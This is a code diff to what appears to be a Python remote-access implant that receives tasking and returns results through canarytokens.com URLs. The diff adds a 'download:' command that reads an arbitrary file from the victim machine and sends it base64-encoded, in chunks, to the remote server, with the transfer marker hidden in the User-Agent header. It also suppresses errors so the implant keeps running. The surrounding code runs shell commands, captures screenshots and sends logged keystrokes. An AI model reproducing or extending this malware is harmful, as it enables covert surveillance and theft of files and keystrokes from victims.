@@ -72,6 +72,7 @@ def enableKeylogger():
 def connect(url,managementURL):
 
     screenshotwarning = False
+    sendfilewarning = False
     global klogging
     global keys
 
@@ -112,6 +113,9 @@ def connect(url,managementURL):
 
             # Fallback token
             if cmd.startswith("fallback:"):
+                decodelist.append(cmd)
+
+            if cmd.startswith("download:"):
                 decodelist.append(cmd)
 
 
@@ -170,14 +174,13 @@ def connect(url,managementURL):
         if command.startswith("fallback:"):
             global canaryManagementURL
             canaryManagementURL = cmd.replace("fallback:", "")
-            ##print("[+] Fallback Canarytoken Detected: ")
+            #print("[+] Fallback Canarytoken Detected: ")
             main()
 
 
         # Adds command to #print working dir
         if command.startswith("task:pwdtask:"):
             command = command.replace("task:pwdtask:", "")
-
             #hacky way to change directory since `cd <dir>` doesn't work with the subprocess module
             if "cd " in command:
                 command = command.replace("cd ", "")
@@ -187,7 +190,6 @@ def connect(url,managementURL):
             else:
                 output = subprocess.check_output(command, shell=True)
                 output = output.rstrip().lstrip().strip()
-
                 output = output.decode('UTF-8')
 
             pwd = subprocess.check_output("cd", shell=True)
@@ -197,12 +199,12 @@ def connect(url,managementURL):
             b64 = base64.b64encode(combined.encode('UTF-8'))
 
         elif command.startswith("saycheese:"):
+            print("SCREENSHOT")
             screenshotwarning = True
             maxlen = 315000
             with mss.mss() as sct:
                 monitors = sct.monitors[0]
                 filename = sct.grab(monitors)
-                #print("screenshot command detected")
                 #Resize image to max so that chunked requests will not be over 50 (b64 len of 343000)
                 #This will get best quality image while staying under 50 chunks
                 # Need to split per monitor for better quality screenshots
@@ -217,15 +219,23 @@ def connect(url,managementURL):
                     else:
                         x += 1
 
-
+        elif command.startswith("download:"):
+            sendfilewarning = True
+            try:
+                requestedFile = command.split("download:")[1]
+                with open(requestedFile, 'rb') as binary_file:
+                    binary_file_data = binary_file.read()
+                    b64 = base64.b64encode(binary_file_data)
+                binary_file.close()
+            except:
+                #If file doesn't exist, send back error
+                b64 = base64.b64encode("File not found".encode('UTF-8'))
 
         elif command.startswith("keyfetch:"):
             keys = (keys + "\n\n" + "-" * 90 + "\n\n")
             keys = ("keys:" + keys.strip())
             b64 = base64.b64encode(keys.encode('UTF-8'))
-            #print (keys)
-
-            #Reset keys to keep string not too large
+            #Reset keys after sent ot  server
             keys = ""
 
         else:
@@ -247,16 +257,17 @@ def connect(url,managementURL):
             #print(str(len(b64)))
 
     except Exception as e:
-        output = "res:Error with last ran command: " + str(e)
-        b64 = base64.b64encode(output.encode('UTF-8'))
-        exc_type, exc_obj, exc_tb = sys.exc_info()
-        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+        #output = "res:Error with last ran command: " + str(e)
+        #b64 = base64.b64encode(output.encode('UTF-8'))
+        #exc_type, exc_obj, exc_tb = sys.exc_info()
+        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
         #print(exc_type, fname, exc_tb.tb_lineno)
+        pass
 
 
     # If data length is too long > 5000, split into multiple requests of 5000 chars
-    if (len(b64) > 7000):
-
+    # Due to the transaction codes (ex. "pic:") we need to trigger below even if file/screenshot does not have to be chunked
+    if (len(b64) > 7000 or sendfilewarning or screenshotwarning):
         #print("[+] Data too long, splitting into multiple requests")
         split = [b64[i:i + 7000] for i in range(0, len(b64), 7000)]
         length = len(split)
@@ -278,16 +289,19 @@ def connect(url,managementURL):
             length = "pic:" + str(length)
             screenshotwarning = False
 
+        elif sendfilewarning == True:
+            length = "incomingfile:" + str(length)
+            sendfilewarning = False
+
         else:
             length = "chunked:" + str(length)
 
-        # Warning the teamserver expect pic
+        # Warning the teamserver of response
         warining = base64.b64encode(length.encode('UTF-8'))
         headers = {"User-Agent": warining,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                    "Upgrade-Insecure-Requests": "1"}
-        #print("[+] Sending chunked data")
         response = requests.get(url, headers=headers)
 
 
@@ -316,9 +330,9 @@ def connect(url,managementURL):
 
 
         except Exception as e:
-            ##print(e)
-            exc_type, exc_obj, exc_tb = sys.exc_info()
-            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+            #print(e)
+            #exc_type, exc_obj, exc_tb = sys.exc_info()
+            #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
             #print(exc_type, fname, exc_tb.tb_lineno)
             pass
 
@@ -353,13 +367,14 @@ def main():
     path = random.choice(canaryPath)
     endpoint = random.choice(canaryEndpoint)
 
-    url = ("http://canarytokens.com/" + path + "/" + canaryManagementURL[canaryManagementURL.index(start) + len(start):
-                                                            canaryManagementURL.index(end)] + "/" + endpoint)
+    url = ("http://canarytokens.com/" + path + "/" + canaryManagementURL[canaryManagementURL.index(start) + len(start):                                                  canaryManagementURL.index(end)] + "/" + endpoint)
     checkin(url)
 
     while True:
-
-        connect(url, canaryManagementURL)
+        try:
+            connect(url, canaryManagementURL)
+        except:
+            pass
 
         #sleep before checking for new tasking
         time.sleep(int(sleepTime))
